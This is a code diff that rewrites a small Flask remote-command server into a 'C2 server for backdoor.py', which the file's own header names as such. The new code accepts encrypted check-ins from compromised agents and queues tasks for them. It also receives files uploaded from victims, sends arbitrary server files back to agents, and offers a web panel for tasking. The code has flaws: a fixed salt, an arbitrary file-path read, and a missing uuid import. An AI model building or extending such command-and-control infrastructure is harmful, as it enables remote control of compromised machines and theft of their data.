@@ -1,146 +1,263 @@
-from flask import Flask, render_template, request, jsonify
-import uuid
-import time
-import threading
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Flask C2 Server for backdoor.py
+- Handles agent check-ins, tasks, and results
+- Provides a web interface for managing agents
+- Uses SQLite for data storage
+- AES encryption compatible with backdoor.py
+"""
+
+import os
 import json
+import base64
+import sqlite3
+import logging
 from datetime import datetime
+from flask import Flask, request, jsonify, render_template
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 app = Flask(__name__)
 
-# Lưu trữ các lệnh và kết quả
-commands = {}
-agents = {}
-results = {}
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    handlers=[
+        logging.FileHandler('c2_server.log'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
 
-class CommandStatus:
-    PENDING = "pending"
-    RUNNING = "running" 
-    COMPLETED = "completed"
-    FAILED = "failed"
+# SQLite database setup
+DB_PATH = 'c2_database.db'
+
+def init_db():
+    """Initialize SQLite database"""
+    with sqlite3.connect(DB_PATH) as conn:
+        c = conn.cursor()
+        c.execute('''CREATE TABLE IF NOT EXISTS agents (
+            agent_id TEXT PRIMARY KEY,
+            system_info TEXT,
+            last_checkin TEXT
+        )''')
+        c.execute('''CREATE TABLE IF NOT EXISTS tasks (
+            task_id TEXT PRIMARY KEY,
+            agent_id TEXT,
+            task_type TEXT,
+            task_data TEXT,
+            status TEXT,
+            result TEXT,
+            timestamp TEXT
+        )''')
+        conn.commit()
+
+def generate_encryption_key(agent_id):
+    """Generate AES encryption key compatible with backdoor.py"""
+    try:
+        salt = b'salt_'
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=salt,
+            iterations=100000,
+        )
+        key = base64.urlsafe_b64encode(kdf.derive(agent_id.encode()))
+        return key
+    except Exception as e:
+        logger.error(f"Encryption key generation error for agent {agent_id}: {e}")
+        return Fernet.generate_key()
+
+def encrypt_data(data, agent_id):
+    """Encrypt data using AES"""
+    try:
+        cipher = Fernet(generate_encryption_key(agent_id))
+        return cipher.encrypt(json.dumps(data).encode()).decode()
+    except Exception as e:
+        logger.error(f"Encryption error for agent {agent_id}: {e}")
+        return json.dumps(data)
+
+def decrypt_data(encrypted_data, agent_id):
+    """Decrypt data using AES"""
+    try:
+        cipher = Fernet(generate_encryption_key(agent_id))
+        return json.loads(cipher.decrypt(encrypted_data.encode()).decode())
+    except Exception as e:
+        logger.error(f"Decryption error for agent {agent_id}: {e}")
+        return {}
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    """Render web interface"""
+    with sqlite3.connect(DB_PATH) as conn:
+        c = conn.cursor()
+        c.execute('SELECT agent_id, system_info, last_checkin FROM agents')
+        agents = c.fetchall()
+        c.execute('SELECT task_id, agent_id, task_type, task_data, status, result, timestamp FROM tasks ORDER BY timestamp DESC')
+        tasks = c.fetchall()
+    return render_template('index.html', agents=agents, tasks=tasks)
 
-@app.route('/api/agents')
-def get_agents():
-    """Lấy danh sách agents đã kết nối"""
-    current_time = time.time()
-    active_agents = {}
-    
-    # Chỉ hiển thị agents còn hoạt động (ping trong vòng 30 giây)
-    for agent_id, agent_info in agents.items():
-        if current_time - agent_info['last_seen'] < 30:
-            active_agents[agent_id] = agent_info
-    
-    return jsonify(active_agents)
-
-@app.route('/api/agent/register', methods=['POST'])
-def register_agent():
-    """Agent đăng ký với server"""
-    data = request.get_json()
-    agent_id = data.get('agent_id', str(uuid.uuid4()))
-    
-    agents[agent_id] = {
-        'id': agent_id,
-        'hostname': data.get('hostname', 'unknown'),
-        'platform': data.get('platform', 'unknown'),
-        'last_seen': time.time(),
-        'registered_at': datetime.now().isoformat()
-    }
-    
-    return jsonify({'status': 'registered', 'agent_id': agent_id})
-
-@app.route('/api/agent/<agent_id>/ping', methods=['POST'])
-def agent_ping(agent_id):
-    """Agent ping để duy trì kết nối"""
-    if agent_id in agents:
-        agents[agent_id]['last_seen'] = time.time()
-        return jsonify({'status': 'ok'})
-    return jsonify({'status': 'not_found'}), 404
-
-@app.route('/api/agent/<agent_id>/poll', methods=['GET'])
-def poll_commands(agent_id):
-    """Agent poll để lấy lệnh mới"""
-    pending_commands = []
-    
-    for cmd_id, cmd_data in commands.items():
-        if (cmd_data['agent_id'] == agent_id and 
-            cmd_data['status'] == CommandStatus.PENDING):
-            pending_commands.append({
-                'command_id': cmd_id,
-                'command': cmd_data['command'],
-                'type': cmd_data['type']
-            })
-    
-    return jsonify(pending_commands)
-
-@app.route('/api/agent/<agent_id>/result', methods=['POST'])
-def submit_result(agent_id):
-    """Agent gửi kết quả về server"""
-    data = request.get_json()
-    command_id = data.get('command_id')
-    
-    if command_id in commands:
-        commands[command_id]['status'] = data.get('status', CommandStatus.COMPLETED)
-        commands[command_id]['output'] = data.get('output', '')
-        commands[command_id]['error'] = data.get('error', '')
-        commands[command_id]['completed_at'] = datetime.now().isoformat()
+@app.route('/api/checkin', methods=['POST'])
+def checkin():
+    """Handle agent check-in"""
+    try:
+        data = request.json.get('data')
+        if not data:
+            return jsonify({'error': 'No data provided'}), 400
         
-        return jsonify({'status': 'received'})
-    
-    return jsonify({'status': 'command_not_found'}), 404
+        # Decrypt data
+        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
+        agent_id = decrypted_data.get('agent_id')
+        if not agent_id:
+            return jsonify({'error': 'Invalid agent_id'}), 400
+        
+        # Store agent info
+        with sqlite3.connect(DB_PATH) as conn:
+            c = conn.cursor()
+            c.execute('INSERT OR REPLACE INTO agents (agent_id, system_info, last_checkin) VALUES (?, ?, ?)',
+                     (agent_id, json.dumps(decrypted_data), datetime.now().isoformat()))
+            conn.commit()
+        
+        logger.info(f"Agent {agent_id} checked in")
+        return jsonify({'status': 'success'}), 200
+    except Exception as e:
+        logger.error(f"Check-in error: {e}")
+        return jsonify({'error': str(e)}), 500
 
-@app.route('/api/command', methods=['POST'])
-def send_command():
-    """Gửi lệnh cho agent"""
-    data = request.get_json()
-    command = data.get('command', '').strip()
-    agent_id = data.get('agent_id')
-    command_type = data.get('type', 'execute')  # execute hoặc kill_all
-    
-    if not command and command_type != 'kill_all':
-        return jsonify({'error': 'Command không được để trống'}), 400
-    
-    if not agent_id:
-        return jsonify({'error': 'Agent ID không được để trống'}), 400
-    
-    command_id = str(uuid.uuid4())
-    commands[command_id] = {
-        'id': command_id,
-        'agent_id': agent_id,
-        'command': command,
-        'type': command_type,
-        'status': CommandStatus.PENDING,
-        'created_at': datetime.now().isoformat(),
-        'output': '',
-        'error': ''
-    }
-    
-    return jsonify({
-        'status': 'sent', 
-        'command_id': command_id,
-        'message': f'Lệnh đã được gửi cho agent {agent_id}'
-    })
+@app.route('/api/tasks', methods=['GET'])
+def get_tasks():
+    """Return tasks for agent"""
+    try:
+        agent_id = request.args.get('agent_id')
+        if not agent_id:
+            return jsonify({'error': 'No agent_id provided'}), 400
+        
+        with sqlite3.connect(DB_PATH) as conn:
+            c = conn.cursor()
+            c.execute('SELECT task_id, task_type, task_data FROM tasks WHERE agent_id = ? AND status = ?',
+                     (agent_id, 'pending'))
+            tasks = [{'id': row[0], 'type': row[1], 'data': json.loads(row[2])} for row in c.fetchall()]
+        
+        encrypted_tasks = [encrypt_data(task, agent_id) for task in tasks]
+        return jsonify({'tasks': encrypted_tasks}), 200
+    except Exception as e:
+        logger.error(f"Get tasks error: {e}")
+        return jsonify({'error': str(e)}), 500
 
-@app.route('/api/commands')
-def get_commands():
-    """Lấy lịch sử các lệnh"""
-    return jsonify(list(commands.values()))
+@app.route('/api/results', methods=['POST'])
+def receive_results():
+    """Receive task results from agent"""
+    try:
+        data = request.json.get('data')
+        if not data:
+            return jsonify({'error': 'No data provided'}), 400
+        
+        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
+        task_id = decrypted_data.get('task_id')
+        agent_id = decrypted_data.get('agent_id')
+        result = decrypted_data.get('result')
+        
+        if not task_id or not agent_id:
+            return jsonify({'error': 'Invalid task_id or agent_id'}), 400
+        
+        with sqlite3.connect(DB_PATH) as conn:
+            c = conn.cursor()
+            c.execute('UPDATE tasks SET status = ?, result = ? WHERE task_id = ?',
+                     ('completed', json.dumps(result), task_id))
+            conn.commit()
+        
+        logger.info(f"Received result for task {task_id} from agent {agent_id}")
+        return jsonify({'status': 'success'}), 200
+    except Exception as e:
+        logger.error(f"Receive results error: {e}")
+        return jsonify({'error': str(e)}), 500
 
-@app.route('/api/command/<command_id>')
-def get_command_result(command_id):
-    """Lấy kết quả của một lệnh cụ thể"""
-    if command_id in commands:
-        return jsonify(commands[command_id])
-    return jsonify({'error': 'Command not found'}), 404
+@app.route('/api/upload', methods=['POST'])
+def upload_file():
+    """Receive file from agent"""
+    try:
+        data = request.json.get('data')
+        if not data:
+            return jsonify({'error': 'No data provided'}), 400
+        
+        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
+        agent_id = decrypted_data.get('agent_id')
+        filename = decrypted_data.get('filename')
+        content = decrypted_data.get('content')
+        
+        if not agent_id or not filename or not content:
+            return jsonify({'error': 'Invalid upload data'}), 400
+        
+        # Save file
+        upload_dir = os.path.join('uploads', agent_id)
+        os.makedirs(upload_dir, exist_ok=True)
+        with open(os.path.join(upload_dir, filename), 'wb') as f:
+            f.write(base64.b64decode(content))
+        
+        logger.info(f"File {filename} uploaded from agent {agent_id}")
+        return jsonify({'status': 'success'}), 200
+    except Exception as e:
+        logger.error(f"Upload error: {e}")
+        return jsonify({'error': str(e)}), 500
 
-@app.route('/api/clear', methods=['POST'])
-def clear_history():
-    """Xóa lịch sử lệnh"""
-    global commands
-    commands = {}
-    return jsonify({'status': 'cleared'})
+@app.route('/api/download', methods=['POST'])
+def download_file():
+    """Send file to agent"""
+    try:
+        data = request.json.get('data')
+        if not data:
+            return jsonify({'error': 'No data provided'}), 400
+        
+        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
+        agent_id = decrypted_data.get('agent_id')
+        file_path = decrypted_data.get('path')
+        
+        if not os.path.exists(file_path):
+            return jsonify({'error': 'File not found'}), 404
+        
+        with open(file_path, 'rb') as f:
+            content = base64.b64encode(f.read()).decode()
+        
+        response = {
+            'filename': os.path.basename(file_path),
+            'content': content
+        }
+        encrypted_response = encrypt_data(response, agent_id)
+        logger.info(f"File {file_path} sent to agent {agent_id}")
+        return jsonify({'data': encrypted_response}), 200
+    except Exception as e:
+        logger.error(f"Download error: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/add_task', methods=['POST'])
+def add_task():
+    """Add a new task for an agent (called from web interface)"""
+    try:
+        agent_id = request.form.get('agent_id')
+        task_type = request.form.get('task_type')
+        task_data = request.form.get('task_data')
+        
+        if not agent_id or not task_type or not task_data:
+            return jsonify({'error': 'Missing required fields'}), 400
+        
+        task_id = str(uuid.uuid4())
+        task_data_json = json.loads(task_data) if task_data else {}
+        
+        with sqlite3.connect(DB_PATH) as conn:
+            c = conn.cursor()
+            c.execute('INSERT INTO tasks (task_id, agent_id, task_type, task_data, status, timestamp) VALUES (?, ?, ?, ?, ?, ?)',
+                     (task_id, agent_id, task_type, json.dumps(task_data_json), 'pending', datetime.now().isoformat()))
+            conn.commit()
+        
+        logger.info(f"Task {task_id} added for agent {agent_id}: {task_type}")
+        return jsonify({'status': 'success', 'task_id': task_id}), 200
+    except Exception as e:
+        logger.error(f"Add task error: {e}")
+        return jsonify({'error': str(e)}), 500
 
 if __name__ == '__main__':
+    init_db()
     app.run(host='0.0.0.0', port=5000, debug=False)
